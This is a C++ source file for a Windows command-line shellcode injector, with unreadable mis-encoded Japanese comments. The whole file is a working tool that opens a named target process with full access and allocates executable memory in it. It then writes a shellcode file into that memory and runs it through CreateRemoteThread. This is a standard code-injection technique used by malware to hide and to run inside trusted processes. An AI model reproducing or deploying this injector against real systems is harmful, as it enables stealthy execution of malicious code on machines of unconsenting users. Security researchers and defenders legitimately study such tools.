// �t�@�C�����Fmain.cpp
// �����F�C�ӂ̃v���Z�X�������ɃV�F���R�[�h����������Ŏ��s����v���O�����ł�
// �g�p���@�F[�C���W�F�N�^�[��] [�v���Z�X��] [�V�F���R�[�h�p�X]

#include"injector.h"

// �G���g���|�C���g
// argv[1]�F�^�[�Q�b�g�v���Z�X��
// argv[2]�FDLL�p�X
// �߂�l�F���������ꍇ��0�A���s�����ꍇ��1
int wmain(int argc, wchar_t* argv[]) {

	// �����̐����`�F�b�N
	if (argc != 3) {
		std::cout << "�g�p���@�F[���̃v���O�����̎��s�\�t�@�C����] [�v���Z�X��] [�V�F���R�[�h�p�X]" << std::endl;
		return 1;
	}

	LPCWSTR processName = argv[1];
	LPCWSTR shellcodePath = argv[2];

	// �����̓��e���`�F�b�N
	if (wcslen(processName) == 0) {
		std::cerr << "[-] �v���Z�X������ł�" << std::endl;
		return 1;
	}

	if (wcslen(shellcodePath) == 0) {
		std::cerr << "[-] �V�F���R�[�h�p�X����ł�" << std::endl;
		return 1;
	}

	// �v���Z�X������v���Z�XID���擾
	DWORD processId = 0;
	BOOL successGetPid = GetProcessIdToProcessName(processName, processId);
	if (!successGetPid) {
		std::cerr << "[-] �v���Z�X������v���Z�XID���擾�ł��܂���ł���" << std::endl;
		return 1;
	}

	// �t�@�C���̃o�C�i���f�[�^��ǂݎ��
	DWORD shellcodeFileSize = 0;
	LPVOID shellcodeAddress = ReadFileBytes(shellcodePath, shellcodeFileSize);
	if (shellcodeAddress == nullptr) {
		std::cerr << "[-] �V�F���R�[�h�̓ǂݍ��݂Ɏ��s���܂���" << std::endl;
		return 1;
	}

	// �e�����\��
	std::wcout
		<< "[�V�F���R�[�h�C���W�F�N�^�[]\n"
		<< "�v���Z�X���F" << processName << "\n"
		<< "�v���Z�XID�F" << processId << "\n"
		<< "�V�F���R�[�h�p�X�F" << shellcodePath << std::endl;


	// �v���Z�X�n���h�����擾
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (processHandle == NULL) {
		std::cerr << "[-] OpenProcess�����s���܂����BError code: " << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "[+] �v���Z�X�n���h�����擾���܂���" << std::endl;

	// DLL�p�X���������ރ������̈���m��
	LPVOID shellcodeMemory = VirtualAllocEx(processHandle, nullptr, shellcodeFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeMemory == NULL) {
		std::cerr << "[-] VirtualAllocEx�����s���܂����BError code: " << GetLastError() << std::endl;
		CloseHandle(processHandle);
		return 1;
	}
	std::cout << "[+] ���������m�ۂ��܂��� " << PrintAddress(shellcodeMemory) << std::endl;

	// DLL�p�X����������
	BOOL successWriteMemory = WriteProcessMemory(processHandle, shellcodeMemory, shellcodeAddress, shellcodeFileSize, nullptr);
	if (successWriteMemory == 0) {
		std::cerr << "[-] WriteProcessMemory�����s���܂����BError code: " << GetLastError() << std::endl;
		VirtualFreeEx(processHandle, shellcodeMemory, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}
	std::cout << "[+] �V�F���R�[�h���������݂܂��� " << std::endl;

	// �����[�g�X���b�h���쐬����DLL�����[�h
	HANDLE threadHandle = CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(shellcodeMemory), nullptr, 0, nullptr);
	if (threadHandle == NULL) {
		std::cerr << "[-] CreateRemoteThread�����s���܂����BError code: " << GetLastError() << std::endl;
		VirtualFreeEx(processHandle, shellcodeMemory, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}
	std::cout << "[+] �����[�g�X���b�h���쐬���܂��� " << std::endl;

	// �����[�g�X���b�h�̏I����ҋ@���Ă���N���[���A�b�v
	WaitForSingleObject(threadHandle, INFINITE);
	VirtualFreeEx(processHandle, shellcodeMemory, 0, MEM_RELEASE);
	CloseHandle(threadHandle);
	CloseHandle(processHandle);
	return 0;
}